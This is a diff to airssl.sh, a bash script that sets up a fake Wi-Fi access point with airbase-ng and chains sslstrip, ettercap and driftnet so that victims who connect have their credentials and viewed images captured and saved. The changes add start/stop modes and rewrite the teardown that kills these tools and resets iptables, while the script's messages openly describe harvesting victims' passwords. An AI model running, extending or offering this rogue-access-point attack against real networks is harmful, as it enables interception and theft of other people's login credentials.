@@ -3,6 +3,7 @@
 # airssl.sh - v2.1-adapt
 # visit the man page NEW SCRIPT Capturing Passwords With sslstrip AIRSSL.sh
 
+if [ "$1" == "start" ];then
 # Network questions
 echo
 echo "AIRSSL 2.1-adapt - Ubuntu working - Credits killadaninja & G60Jon - Adaptation by Nyzo"
@@ -83,7 +84,7 @@ fi
 # Tables
 echo "[+] Configuring forwarding tables..."
 ifconfig lo up
-ifconfig at0 up &
+ifconfig at0 up
 sleep 1
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
 ifconfig at0 mtu 1400
@@ -165,33 +166,51 @@ echo "[+] Activated..."
 echo "Airssl is now running, after victim connects and surfs their credentials will be displayed in ettercap. You may use right/left mouse buttons to scroll up/down ettercaps xterm shell, ettercap will also save its output to /pentest/wireless/airssl/passwords unless you stated otherwise. Driftnet images will be saved to /pentest/wireless/airssl/driftftnetdata "
 echo
 echo "[+] IMPORTANT..."
-echo "After you have finished please close airssl and clean up properly by hitting Y,
-if airssl is not closed properly ERRORS WILL OCCUR "
-read WISH
+echo "After you have finished please close airssl (press enter) and clean up properly by command ./airssl.sh stop, airssl is not closed properly ERRORS WILL OCCUR "
+exit
 
+elif [ "$1" == "stop" ] ; then
 # Clean up
-if [ $WISH = "y" ] ; then
 echo
 echo "[+] Cleaning up airssl and resetting iptables..."
 
-kill ${fakeapid}
-kill ${dchpid}
-kill ${sslstripid}
-kill ${ettercapid}
-kill ${dritnetid}
-kill ${sslstriplogid}
+echo -n "Enter your interface used for the fake AP, generally wlan0 or wlan1: "
+read -e fakeap_interface
+fakeap=$fakeap_interface
+fakeap_interface="mon0"
+
+pkill airbase-ng
+echo "[+] Airbase-ng (fake ap) killed"
+pkill dhcpd
+echo "[+] DHCP killed"
+pkill sslstrip
+echo "[+] SSLStrip killed"
+pkill ettercap
+echo "[+] Ettercap killed"
+pkill driftnet
+echo "[+] Driftnet killed"
+pkill sslstrip.log
+echo "[+] SSLStrip log killed"
 
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
+echo "[+] Airmon-ng stopped"
+echo
 echo "0" > /proc/sys/net/ipv4/ip_forward
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
+echo "[+] iptables restored"
+echo
+ifconfig wlan0 up
 
 echo "[+] Clean up successful..."
 echo "[+] Thank you for using airssl, Good Bye..."
 exit
 
+else
+echo "usage: ./airssl.sh stop|start"
 fi
+
 exit
